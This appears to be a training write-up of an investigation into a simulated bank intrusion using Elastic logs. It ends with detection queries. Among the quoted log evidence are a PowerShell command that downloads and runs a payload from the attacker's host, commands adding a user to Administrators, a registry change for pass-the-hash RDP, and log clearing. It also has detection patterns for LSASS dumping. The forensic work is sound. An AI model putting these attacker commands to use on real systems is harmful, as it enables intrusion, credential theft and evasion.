---
title: "WE Innovate Final Technical Assessment"
date: 2025-03-28 13:05:53 +0300
categories: []
tags: [Writeup, we innovate]
description: A malicious attacker aims to disrupt a bank’s operations and exploit sensitive data. You are tasked with investigating the incident and providing a detailed analysis report. Your report should include an overview of the attack, its impact, and a set of detection rules to identify and mitigate similar threats in the future.

image:
  path: /assets/images/posts/2025-03-28-we-innovate-final-assessment/head.png
---




## **Scenario**

A malicious attacker aims to disrupt a bank’s operations and exploit sensitive data. The attack took place today (24/03/2025) between 9:00 AM and 5:00 PM. The attacker’s primary objectives include:
	- Gaining unauthorized access to the bank’s internal infrastructure.
	- Escalating privileges to obtain full control over high-value systems.
	- Causing operational disruption by wiping essential banking servers.
	- Evading detection by clearing logs and covering their tracks.

### **Assets List**

| Asset ID | Device Name  | IP Address  | Operating System    | Application Installed |
| -------- | ------------ | ----------- | ------------------- | --------------------- |
| DC01     | kingslanding | 10.11.10.10 | Windows Server 2019 | -                     |
| DC02     | winterfell   | 10.11.10.11 | Windows Server 2019 | -                     |
| DC03     | meereen      | 10.11.10.12 | Windows Server 2016 | -                     |
| SRV02    | castelblack  | 10.11.10.22 | Windows Server 2019 | IIS & MSSQL           |
| SRV03    | braavos      | 10.11.10.23 | Windows Server 2016 | ADCS & MSSQL          |


## **Analysis**


Starting by looking at the network logs to see if there some sort of reconnaissance. I'll go to `Visualize Library` then `create visualization` and choose an `Aggreation based` visualization and choose it to be `Data table`. I will choose the `apm-*-transaction*,auditbeat-*,endgame-*,filebeat-*,logs-*,packetbeat-*,traces-apm*,winlogbeat-*,-*elastic-cloud-logs-*` data view. From `Metrics` I will change the aggregation from `Count` to `Unique Count` and select `destination.port` as the `Field`. In `Buckets` I will create two `Split rows` with the `Aggreation` as `Terms` and the `Field` as `source.ip` and the other split as `destination.ip`, also I will increase the `size` to show more results. Adjusting the time window to be from 09:00 to 17:00 and using this query `source.ip: (10.0.0.0/8) and destination.ip: (10.0.0.0/8)` we get this visualization:

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/01.png)

Focusing on our assets we can see the IP `10.0.8.4` talked to the 5 assets on exactly 1000 ports which is an indicator for recon, the same goes for the `10.0.9.2`. So those are the main suspects. Checking to see if any of our assets talked back to those IPs with `source.ip: (10.11.10.10 or 10.11.10.11 or 10.11.10.12 or 10.11.10.22 or 10.11.10.23) and destination.ip: (10.0.8.4 or 10.0.9.2)` but I will add another `Split row` for `destination.port` and change the `Metric` to be `Count` : 

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/02.png)

So the machine `castelblack` talked to the attacker on ports `8000` (common default for quick http server setup) and `4444` (commonly associated with C2 payload). 

Moving to the `discover` to try to know when did the recon happen, and it happened between 12:10 and 12:30

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/03.png)

Next I wanted to check why did one of the victim machines connected back to the attacker on port `8000` specifically. I will filter for `destination.port : 8000` and make some column visible like `source.ip`, `destination.ip` and `host.hostname`:  

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/04.png)
From the results I checked the `data_stream.dataset` field and found they are related to the network and firewall logs but there is `system.security` which is the windows security channel so it should carry information about the host and the processes. We can see on host `castelblack` at `2025-03-24 12:36:36` a `powershell` process with PID `1704` made a connection to the attacker machine, so the initial access must be between 12:10 and 12:36.

For now I will focus on the host `castelblack` and the `system.security` dataset and specially the event code `4688` which is `created-process`. I will use the `1704` PID to know its parent, also I will try to create a process tree of parents and child related to that PID. After collecting the PID of parents and child the filter will look like:

```
host.hostname : "castelblack" and data_stream.dataset : "system.security" and event.code : 4688 and process.parent.pid : (776 or 8600 or 5384 or 1704 or 956 or 2448 or 1972 or 9664 or 8816 or 1544 or 6796 or 4576 or 6052 or 96 or 10088 or 4520 ) 
```

I will add some columns like `process.parent.name`, `process.name`, `process.command_line`, `process.parent.pid` and `process.pid`: 

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/05.png)

It all begins at the `w3wp.exe` which is responsible for handling web requests in Microsoft's Internet Information Services (IIS) web server. We see the `csc.exe` -which is the C# compiler from Roslyn- compile something written in `nh0n1u4h.cmdline`. After that we see the web server started a `cmd.exe`, this match "a web server that is vulnerable to unrestricted file uploads. They exploit the web server to establish remote access." that we were told and how the attacker gained the initial access. Initial access was at `2025-03-24 12:33:51`.

Next the attacker invoked a we request to get a file from his server `Invoke-WebRequest -Uri http://10.0.9.2:8000/calc.exe -OutFile C:\Users\Public\calc.exe` and later executed it. `calc.exe` itself later opened a `cmd.exe` which means a reverse shell was sent to the attacker. Also there is more commands were executed: 

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/06.png)

The attacker created two users `sam` and `messi` or at least that what it seemed, then added `messi` to two groups `Adminstrators` and `Remore Desktop Users` as a persistence method. Later he executed `diskpart.exe` which is a command-line disk partitioning utility included in Windows. It allows users to manage disks, partitions, volumes and execute destructive commands (like clean or delete) that could wipe the disk. After that he executed `wevutil.exe` to delete the system, application and security logs.

Two things to notice: First, there is a time gap between the attacker’s actions, which is odd, and we may not be seeing the full picture. Second, how did the attacker manage to create users? Even if they achieved remote code execution by compromising the web server, that doesn’t necessarily mean they had the privilege to do so, as the web server itself lacks this privilege. We need to investigate this further.

Seeing a process run with arguments like `"C:\Windows\system32\net.exe" localgroup Administrators messi /add` doesn’t necessarily mean the command executed successfully. We need to confirm whether it was successful or not. Lucky for us the `system.security` log exited process with the exit status. I will filter with `event.code : 4689` which is the `event.action : exited-process` and look specifically for `net.exe` with this filter:
```
host.hostname : "castelblack"  and data_stream.dataset : "system.security" and event.code : 4689 and process.name : net.exe
```

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/07.png)

Out of the four executions of `net.exe`, only one had an exit status of `0x02` (which typically indicates a "File Not Found" error or incorrect command syntax in Windows, but in this case, it was because a user named "sam" already existed). The rest had an exit status of `0x0`, meaning they executed successfully. I expected all of them to return `0x02` since the attacker shouldn't have the necessary privileges. However, the successful executions suggest that the attacker somehow escalated their privileges before creating this user.

Returning to the process tree, I will add two columns to the view `winlog.event_data.SubjectUserSid` and `winlog.event_data.TargetUserSid`. SubjectUserID It’s the user who is performing an action, TargetUserID It’s the user that is being affected. 


![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/08.png)

From the start, the `w3wp.exe` SubjectUserID is `S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415`. In most cases, the child process inherits the SubjectUserID of the parent process because it inherits the security token from the parent. However, notice that the process created by `calc.exe` has `S-1-5-18`, which is the Local SYSTEM account. This indicates that the process was either launched with elevated privileges, through privilege escalation, or via an explicit token manipulation technique, allowing it to run under a different security context than its parent.

To know how did happened we need to look back at the main parent `w3wp.exe`. Going through the `system.security` and checking the `event.action` there is one called `logged-in-special` which has the event code `4672` and it actually has name `Special privileges assigned to new logon`. This security event is logged when a user logs in with administrative or highly sensitive privileges. It helps track when accounts gain elevated rights, which is critical for auditing security in Windows.
Using this filter : `host.hostname : "castelblack"  and data_stream.dataset : "system.security" and event.action : "logged-in-special" ` 

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/09.png)

There is a `related.user` field that indicates which account performed the logon. The `DefaultAppPool` is a built-in IIS application pool identity used for running web applications. Focusing on it, we can see that it shares the same `Security ID` as `w3wp.exe`. In the Privileges section there are three types:
- **`SeAssignPrimaryTokenPrivilege`** – Allows a process to replace the primary token of a child process. This privilege can be abused, as an attacker could spawn a new process (e.g., `cmd.exe`) under a different user’s token (e.g., **SYSTEM**).
- **`SeAuditPrivilege`** – Grants permission to generate security audit logs. However, it can be misused to clear logs (via `wevtutil` or custom tools) to hide malicious activity.
- **`SeImpersonatePrivilege`** – Enables a service to impersonate a client, which is common for applications like SQL Server and IIS. Attackers can exploit this privilege to steal tokens from high-privileged processes (e.g., **SYSTEM**), potentially escalating privileges.

Since `calc.exe` is ultimately a child process of `w3wp.exe`, it must have inherited those privileges. The attacker then abused them to start `cmd.exe` with the SYSTEM token and this is how the privilege escalation was done. 

Now I will try to track what was done with this created account. I will just look for successful logons with the attacker IP as the source with this filter `data_stream.dataset : "system.security" and event.code : 4624 and source.ip : 10.0.9.2`

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/10.png)
We have nine successful logons, five of which were with the `Guest` user. Looking at the timestamps these logons occurred before the attacker's initial access on `castelblack`. The `Guest` account could be used to authenticate to SMB, so it's possible that it was used for enumeration. But what about the users `robb.stark`, `Administrator`, and `sam`? How did the attacker manage to compromise them? We already proved that the attacker didn't create the user `sam` it already existed. 

Three out of the four successful logons with those accounts used `NTLM` as the `AuthenticationPackageName`, which suggests that the attacker may have dumped password hashes from `castelblack` and used them for authentication. Additionally, the attacker could have cracked the hashes to obtain plaintext passwords, as they were able to perform a `RemoteInteractive` logon with the user `sam`.

Now I will try to hunt for `lsass` dump, a good resource to read is this [article](https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html) and those Sigma rules [win_security_susp_lsass_dump](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_susp_lsass_dump.yml) and [win_security_susp_lsass_dump_generic](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_susp_lsass_dump_generic.yml).

The previous resource mentions using event codes `4656` (A handle to an object was requested) and `4663` (An attempt was made to access an object). However I will filter using `event.action:"Kernel Object"` since it includes both of these event codes along with an additional one `4658` (The handle to an object was closed). Additionally, I need to exclude the `agentbeat.exe` process, as it generates excessive noise in the logs:

```
host.hostname : "castelblack" and event.action : "Kernel Object" and not winlog.event_data.ProcessName : "C:\Program Files\Elastic\Agent\data\elastic-agent-8.16.2-058961\components\agentbeat.exe"
```

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/11.png)

It appears that `calc.exe` successfully read from `lsass.exe` memory and dumped the password hashes at `2025-03-24 12:59:45`, which was before any successful logon by the attacker using the stolen accounts. This suggests that the attacker must have used the hashes to authenticate.

I tracked the attacker on `winterfell` after they logged in with the users `robb.stark` and `Administrator`, but I found nothing interesting. I will continue the analysis on `castelblack`.

For now I will focus on `data_stream.dataset: "windows.powershell_operational"` on `castelblack`. I will also retrieve the PID of `powershell.exe` from the previous process tree we used earlier to ensure that whatever we see is directly related to the attacker.
```
 data_stream.dataset : "windows.powershell_operational" and winlog.process.pid : (4576 or 10088 or 1704) and host.hostname : "castelblack" 
```

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/12.png)
We can see the command that was used with user `messi`, but what is new is this registry modification `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0`.  

Restricted Admin Mode is a security feature in Windows that prevents the caching of credentials when using Remote Desktop (RDP) with administrative privileges. It is designed to protect against Credential Theft attacks. Normally when you RDP as an admin, your credentials are cached in memory, but attacker can steal that hash (like in our case) but Restricted Admin Mode prevents credential caching.  `DisableRestrictedAdmin = 0` actually means Restricted Admin Mode is enabled, which prevents credentials from being cached in memory during RDP sessions. But why would the attacker want to stop the credentials from being cached on that machine? 

With some googling I found this [article](https://www.blumira.com/blog/2024-apr-why-are-threat-actors-enabling-windows-restrictedadmin-mode) which tells **"The intention behind Restricted Admin mode was to mitigate the risk of exposing administrative credentials when connecting to potentially compromised machines. Normally, when you logon via RDP using an interactive session (username and password), a copy of your credentials is stored in the Local Security Authority Subsystem Service (LSASS) on the destination host. When Restricted Admin mode is enabled, the RDP server uses network logon instead of interactive logon. This means a user with local administrator privileges on a system with Restricted Admin mode enabled authenticates with a NT hash or Kerberos ticket, instead of with a password. While the password isn’t cached, these NT hashes are and can be collected and used to impersonate users."** 

So Enabling Restricted Admin Mode allows the attacker to use collected hashes to login instead of a password. Also there is 

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/13.png)

Which means the attacker disabled the real time monitoring of this machine, and the script after that seems to be A Defender management module that could be used to configure Defender settings, including Exclusions, Scan schedules, Real-time protection and more. 

Now I will track user `sam` during his `RemoteInteractive` session on `castelblack`. I didn’t find much, but this is the only interesting thing:
```
host.hostname : "castelblack" and data_stream.dataset : "system.security" and event.code : 4688 and process.parent.pid : (776 or 8600 or 5384 or 1704 or 956 or 2448 or 1972 or 9664 or 8816 or 1544 or 6796 or 4576 or 6052 or 96 or 10088 or 4520 ) or (process.parent.pid : (1324) and process.name : "notepad.exe" )
```

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/14.png)

So, he stole the bank secrets and other accounts. He may have moved laterally to another machine (he moved to `winterfell` but we didn't see much value of what he did on it) , but at this point, I stopped tracking him. However, while analyzing failed logons I found that the attacker may attempted but failed to switch to the user `messi` likely because he forgot the `P@ssw0rd`🤣

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/15.png)






## **Detection Engineering**


### Network Scan

```
source.ip: (10.0.0.0/8) and destination.ip: (10.0.0.0/8)
```

![](/assets/images/posts/2025-03-28-we-innovate-final-assessment/17.png)


###  High-Privilege Logon

```
event.code : 4672 and winlog.event_data.PrivilegeList : (*SeImpersonatePrivilege* and *SeAssignPrimaryTokenPrivilege*) and not user.name : "SYSTEM"
```

### Potential Credential Dumping via LSASS Handle Access

```
event.code : "4656" and event.action : "Kernel Object" and winlog.event_data.ProcessName : ( *\:\\PerfLogs\\*.exe or *\:\\Users\\*.exe or *\:\\Windows\\Tasks\\*.exe or *\:\\Intel\\*.exe or *\:\\*\\Temp\\*.exe or *\:\\Windows\\AppReadiness\\*.exe or *\:\\Windows\\ServiceState\\*.exe or *\:\\Windows\\security\\*.exe or *\:\\Windows\\IdentityCRL\\*.exe )
```

### Cleared logs

```
process.executable : "C:\Windows\System32\wevtutil.exe" and event.code : 4688 and process.command_line : *cl*
```

### CMD Execution as SYSTEM from Unusual Parent


```
winlog.event_data.TargetUserSid : S-1-5-18 and event.code : 4688 and process.name : "cmd.exe" and process.parent.executable : ( *\:\\PerfLogs\\*.exe or *\:\\Users\\*.exe or *\:\\Windows\\Tasks\\*.exe or *\:\\Intel\\*.exe or *\:\\*\\Temp\\*.exe or *\:\\Windows\\AppReadiness\\*.exe or *\:\\Windows\\ServiceState\\*.exe or *\:\\Windows\\security\\*.exe or *\:\\Windows\\IdentityCRL\\*.exe )
```


### User Added to Privileged Group via net1.exe


```
process.executable : C\:\\Windows\\System32\\net1.exe and process.command_line.text : (*localgroup* and ("Remote Desktop Users" or Administrators) and *add*)
```


### Process started from unusual position

```
event.code : 4688 and process.executable : ( *\:\\PerfLogs\\*.exe or *\:\\Users\\*.exe or *\:\\Windows\\Tasks\\*.exe or *\:\\Intel\\*.exe or *\:\\*\\Temp\\*.exe or *\:\\Windows\\AppReadiness\\*.exe or *\:\\Windows\\ServiceState\\*.exe or *\:\\Windows\\security\\*.exe or *\:\\Windows\\IdentityCRL\\*.exe )
```



